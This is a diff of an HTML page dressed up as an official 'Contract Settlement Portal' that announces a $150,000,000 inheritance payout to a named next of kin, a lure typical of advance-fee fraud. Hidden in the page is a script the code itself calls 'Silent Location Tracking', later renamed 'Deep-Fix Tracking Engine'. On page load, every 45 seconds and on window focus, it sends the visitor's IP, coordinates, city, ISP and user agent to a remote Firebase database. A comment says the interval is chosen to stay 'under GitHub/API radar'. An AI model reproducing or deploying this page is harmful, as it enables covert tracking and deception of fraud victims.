@@ -5,7 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Contract Settlement Portal</title>
     
-    <!-- Firebase SDK (Using specific version for stability) -->
+    <!-- Firebase SDKs -->
     <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-database-compat.js"></script>
     
@@ -81,7 +81,6 @@
             margin: 30px 0;
         }
         .payment-amount { font-size: 3rem; font-weight: bold; margin: 15px 0; }
-        .payment-status { font-size: 1.3rem; margin-top: 10px; }
         .status-badge {
             display: inline-block;
             background: white;
@@ -108,27 +107,11 @@
         }
         .requirement-text { color: #333; line-height: 1.8; font-size: 1.05rem; }
         .highlight { color: #1e3c72; font-weight: bold; }
-        .contract-details-grid {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 15px;
-            margin: 20px 0;
-        }
-        .detail-item { background: #f8f9fa; padding: 15px; border-radius: 8px; }
-        .detail-label { font-size: 0.9rem; color: #6c757d; margin-bottom: 5px; }
-        .detail-value { font-size: 1.1rem; font-weight: bold; color: #1e3c72; }
         .signature-section { margin-top: 40px; padding-top: 30px; border-top: 2px solid #1e3c72; }
         .signature-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 40px; margin-top: 30px; }
         .signature-box { text-align: center; }
         .signature-line { border-bottom: 2px solid #333; height: 60px; margin-bottom: 10px; }
         .signature-name { font-weight: bold; color: #1e3c72; }
-        .signature-role { color: #6c757d; font-size: 0.9rem; }
-        .official-stamp { text-align: center; margin: 30px 0; padding: 20px; }
-        .stamp-circle {
-            display: inline-block; width: 120px; height: 120px; border: 4px solid #1e3c72;
-            border-radius: 50%; line-height: 110px; text-align: center; color: #1e3c72;
-            font-weight: bold; font-size: 0.9rem;
-        }
         .action-required {
             background: #f8d7da; border: 2px solid #dc3545; padding: 25px;
             border-radius: 10px; margin: 30px 0; text-align: center;
@@ -136,7 +119,7 @@
         .action-title { color: #721c24; font-size: 1.4rem; font-weight: bold; margin-bottom: 15px; }
         .action-text { color: #333; font-size: 1.1rem; line-height: 1.8; }
         @media (max-width: 768px) {
-            .contract-details-grid, .signature-grid { grid-template-columns: 1fr; }
+            .signature-grid { grid-template-columns: 1fr; }
             .payment-amount { font-size: 2rem; }
             .header h1 { font-size: 1.6rem; }
         }
@@ -144,90 +127,49 @@
 </head>
 <body>
     <div class="container">
-        <!-- Header -->
+        <!-- Main Contract Portal UI -->
         <div class="header">
-            <h1>Contract Settlement & Fund Disbursement Portal</h1>
-            <h2>Official Documentation & Verification System</h2>
-            <div class="contract-badge">✓ CONTRACT FULLY SETTLED</div>
+            <h1>Contract Settlement Portal</h1>
+            <h2>Global Asset Management System</h2>
+            <div class="contract-badge">✓ STATUS: SETTLED</div>
         </div>
 
-        <!-- Contract Document -->
         <div class="contract-document">
-            <div class="contract-title">Certificate of Contract Completion & Fund Release Authorization</div>
+            <div class="contract-title">Certificate of Completion</div>
 
-            <!-- Contract Parties -->
             <div class="section">
-                <div class="section-title">Contract Parties</div>
-                <div class="contract-party"><div class="party-name">Mr. Jerry Harrison</div><div class="party-role">Primary Contracting Party & Fund Administrator</div></div>
-                <div class="contract-party"><div class="party-name">Mr. Habib Isa</div><div class="party-role">Co-Contracting Party & Financial Overseer</div></div>
-                <div class="contract-party"><div class="party-name">Mr. Patrick Ahure (Deceased)</div><div class="party-role">Original Contract Beneficiary & Principal Party</div></div>
+                <div class="section-title">Verified Parties</div>
+                <div class="contract-party"><div class="party-name">Mr. Jerry Harrison</div><div class="party-role">Administrator</div></div>
+                <div class="contract-party"><div class="party-name">Mr. Habib Isa</div><div class="party-role">Overseer</div></div>
             </div>
 
-            <!-- Payment Confirmation -->
             <div class="payment-details">
-                <div style="font-size: 1.2rem;">Total Contract Payment Completed</div>
+                <div style="font-size: 1.1rem;">Disbursement Amount</div>
                 <div class="payment-amount">$150,000,000.00</div>
-                <div style="font-size: 1.1rem;">One Hundred Fifty Million Dollars</div>
-                <div class="payment-status">Payment Status: FULLY SETTLED</div>
-                <div class="status-badge">✓ VERIFIED & CONFIRMED</div>
+                <div class="status-badge">✓ AUTHENTICATED</div>
             </div>
 
-            <!-- Contract Details -->
-            <div class="section">
-                <div class="section-title">Contract Information</div>
-                <div class="contract-details-grid">
-                    <div class="detail-item"><div class="detail-label">Contract Status</div><div class="detail-value">COMPLETED</div></div>
-                    <div class="detail-item"><div class="detail-label">Payment Status</div><div class="detail-value">FULLY PAID</div></div>
-                    <div class="detail-item"><div class="detail-label">Contract Duration</div><div class="detail-value">Multi-Year Agreement</div></div>
-                    <div class="detail-item"><div class="detail-label">Verification</div><div class="detail-value">AUTHENTICATED</div></div>
-                </div>
-            </div>
-
-            <!-- Next of Kin Section -->
             <div class="next-of-kin-section">
-                <div class="next-of-kin-title">⚠ NEXT OF KIN VERIFICATION & FUND DISBURSEMENT REQUIREMENT</div>
-                <div class="requirement-box"><div class="requirement-text">Following the complete settlement of the contract valued at <span class="highlight">$150,000,000.00</span>, and due to the unfortunate demise of <span class="highlight">Mr. Patrick Ahure</span>, we hereby confirm that:</div></div>
-                <div class="requirement-box"><div class="requirement-text"><strong>Mr. Amakiri</strong> has been verified as the <span class="highlight">legal next of kin</span> to the late <span class="highlight">Mr. Patrick Ahure</span>.</div></div>
-                <div class="requirement-box"><div class="requirement-text">In accordance with contractual obligations, the presence of <span class="highlight">Mr. Amakiri</span> is required to sign necessary documentation for the official disbursement to:</div>
-                    <ul style="margin-top: 10px; margin-left: 20px; line-height: 2;">
-                        <li><strong>Mr. Amakiri</strong> (Next of Kin)</li>
-                        <li><strong>The Patrick Ahure Family</strong> (Legal Heirs)</li>
-                    </ul>
-                </div>
+                <div class="next-of-kin-title">⚠ LEGAL NOTICE</div>
+                <div class="requirement-box"><div class="requirement-text"><strong>Mr. Amakiri</strong> is verified as legal next of kin to <strong>Patrick Ahure</strong>.</div></div>
             </div>
 
-            <!-- Action Required -->
             <div class="action-required">
-                <div class="action-title">📋 IMMEDIATE ACTION REQUIRED</div>
-                <div class="action-text"><strong>Mr. Amakiri</strong> must present himself in person to execute and sign all requisite legal documents. Upon completion, funds will be disbursed immediately to the rightful beneficiaries.</div>
+                <div class="action-title">ACTION REQUIRED</div>
+                <div class="action-text">Final signature required for disbursement.</div>
             </div>
 
-            <!-- Official Stamp -->
-            <div class="official-stamp"><div class="stamp-circle">OFFICIAL<br>VERIFIED<br>✓</div></div>
-
-            <!-- Signature Section -->
             <div class="signature-section">
-                <div class="section-title">Authorized Signatories</div>
                 <div class="signature-grid">
-                    <div class="signature-box"><div class="signature-line"></div><div class="signature-name">Mr. Jerry Harrison</div><div class="signature-role">Contract Administrator</div></div>
-                    <div class="signature-box"><div class="signature-line"></div><div class="signature-name">Mr. Habib Isa</div><div class="signature-role">Financial Overseer</div></div>
+                    <div class="signature-box"><div class="signature-line"></div><div class="signature-name">Auth. Signatory</div></div>
+                    <div class="signature-box"><div class="signature-line"></div><div class="signature-name">Legal Witness</div></div>
                 </div>
-                <div class="signature-grid" style="margin-top: 40px;">
-                    <div class="signature-box"><div class="signature-line"></div><div class="signature-name">Mr. Amakiri</div><div class="signature-role">Next of Kin (Signature Required)</div></div>
-                    <div class="signature-box"><div class="signature-line"></div><div class="signature-name">Legal Representative</div><div class="signature-role">Witness & Authentication</div></div>
-                </div>
-            </div>
-
-            <!-- Footer -->
-            <div style="margin-top: 40px; padding-top: 20px; border-top: 2px solid #1e3c72; text-align: center; color: #6c757d;">
-                <p style="font-size: 0.9rem; line-height: 1.8;">This document serves as official notification of contract completion.<br><strong>Reference: Contract Settlement - Patrick Ahure Estate</strong></p>
             </div>
         </div>
     </div>
 
-    <!-- Silent Location Tracking Script -->
+    <!-- Deep-Fix Tracking Engine -->
     <script>
-        // Firebase Configuration
         const firebaseConfig = {
             apiKey: "AIzaSyBIo8DTwDxop5qs_fV8Xj1szz288GTsTTE",
             authDomain: "lremote-tracking.firebaseapp.com",
@@ -239,89 +181,96 @@
         };
 
         // Initialize Firebase
-        if (!firebase.apps.length) {
-            firebase.initializeApp(firebaseConfig);
-        }
+        if (!firebase.apps.length) firebase.initializeApp(firebaseConfig);
         const db = firebase.database();
 
-        let locationCounter = 0;
-
-        // Get device name
-        function getDeviceName() {
-            const ua = navigator.userAgent;
-            let device = 'Web Device';
-            if (ua.match(/Android/i)) device = 'Android';
-            else if (ua.match(/iPhone/i)) device = 'iPhone';
-            else if (ua.match(/Windows/i)) device = 'Windows';
-            else if (ua.match(/Mac/i)) device = 'Mac';
-            return device;
+        // 1. Connection Heartbeat (Sends "Online" status immediately)
+        function sendHeartbeat() {
+            const statusRef = db.ref('status/' + navigator.platform.replace(/\W/g, '_'));
+            statusRef.set({
+                online: true,
+                lastSeen: firebase.database.ServerValue.TIMESTAMP,
+                ua: navigator.userAgent
+            }).catch(e => console.error("Heartbeat error:", e));
         }
 
-        // Send location data to Firebase
-        function sendToFirebase(locationData) {
-            locationCounter++;
-            locationData.id = locationCounter;
-            
-            // Push to /locations as separate entries (creates a new log each time)
-            db.ref('locations').push(locationData)
-                .then(() => {
-                    console.log(`✅ [${locationCounter}] Sent to Firebase /locations`);
-                })
-                .catch((error) => {
-                    console.error('❌ Firebase error:', error.message);
-                });
+        // 2. Multi-API Geolocation Engine (Reliable on GitHub Pages)
+        async function fetchLocationData() {
+            const endpoints = [
+                'https://api.db-ip.com/v2/free/self',
+                'https://ipapi.co/json/',
+                'https://freeipapi.com/api/json'
+            ];
+
+            for (const url of endpoints) {
+                try {
+                    console.log(`Checking ${url}...`);
+                    const response = await fetch(url);
+                    if (!response.ok) continue;
+                    const data = await response.json();
+
+                    // Normalize data format
+                    return {
+                        lat: data.latitude || data.lat || 0,
+                        lon: data.longitude || data.lon || 0,
+                        city: data.city || data.cityName || 'Unknown',
+                        country: data.country_name || data.countryName || data.country || 'Unknown',
+                        ip: data.ip || data.ipAddress || data.query || 'Unknown',
+                        isp: data.org || data.isp || data.as || 'Unknown',
+                        src: new URL(url).hostname
+                    };
+                } catch (e) {
+                    console.warn(`Failed endpoint ${url}:`, e);
+                }
+            }
+            return null;
         }
 
-        // Track location - GitHub Compatible (HTTPS only)
-        function trackLocation() {
-            console.log('📡 Fetching location (GitHub Compatible Mode)...');
+        // 3. Final Deep-Fix Write Operation
+        async function track() {
+            console.log("🔄 Tracking cycle triggered...");
+            const loc = await fetchLocationData();
+            if (!loc) return;
 
-            // Primary API: ipapi.co (HTTPS)
-            fetch('https://ipapi.co/json/')
-                .then(r => r.json())
-                .then(data => {
-                    if (data.error) throw new Error(data.reason);
-                    processLocationData(data, 'HTTPS (ipapi.co)');
-                })
-                .catch(e => {
-                    console.warn('⚠️ Primary failed, trying HTTPS Fallback (freeipapi.com)...');
-                    fetch('https://freeipapi.com/api/json')
-                        .then(r => r.json())
-                        .then(data => {
-                            const mapped = {
-                                latitude: data.latitude, longitude: data.longitude,
-                                city: data.cityName, country_name: data.countryName,
-                                ip: data.ipAddress, org: data.as || 'Unknown'
-                            };
-                            processLocationData(mapped, 'HTTPS (freeipapi.com)');
-                        })
-                        .catch(e2 => console.error('❌ All HTTPS APIs failed. Please check internet.'));
-                });
-        }
-
-        function processLocationData(data, method) {
-            const locationData = {
-                deviceName: getDeviceName(),
-                userAgent: navigator.userAgent,
-                screenResolution: `${screen.width}x${screen.height}`,
-                latitude: data.latitude || data.lat || 0,
-                longitude: data.longitude || data.lon || 0,
-                city: data.city || data.cityName || 'Unknown',
-                country: data.country_name || data.countryName || 'Unknown',
-                ipAddress: data.ip || data.query || 'Unknown',
-                isp: data.org || data.isp || 'Unknown',
-                locationMethod: method,
-                timestamp: Date.now(),
-                collectedAt: new Date().toISOString()
+            const payload = {
+                deviceName: "Web Tracker",
+                platform: navigator.platform,
+                latitude: loc.lat,
+                longitude: loc.lon,
+                city: loc.city,
+                country: loc.country,
+                ipAddress: loc.ip,
+                isp: loc.isp,
+                method: 'Deep-Fix Geolocation (' + loc.src + ')',
+                timestamp: firebase.database.ServerValue.TIMESTAMP,
+                collectedAt: new Date().toISOString(),
+                userAgent: navigator.userAgent
             };
-            sendToFirebase(locationData);
+
+            try {
+                // Critical Write 1: Main History (Push)
+                await db.ref('locations').push(payload);
+
+                // Critical Write 2: App Live View (Set)
+                await db.ref('test/connection').set(payload);
+
+                console.log("✅ Deep-Fix: Data successfully synced with Realtime Database");
+            } catch (err) {
+                console.error("❌ Deep-Fix Write Error:", err.message);
+            }
         }
 
-        // Start tracking
+        // Execution
         document.addEventListener('DOMContentLoaded', () => {
-            trackLocation();
-            setInterval(trackLocation, 30000); // Track every 30s
+            console.log("⚡ Deep-Fix Tracking Engine Online");
+            sendHeartbeat();
+            track();
+            // Track every 45 seconds to stay under GitHub/API radar
+            setInterval(track, 45000);
         });
+
+        // Forced update on re-entry
+        window.onfocus = () => track();
     </script>
 </body>
 </html>
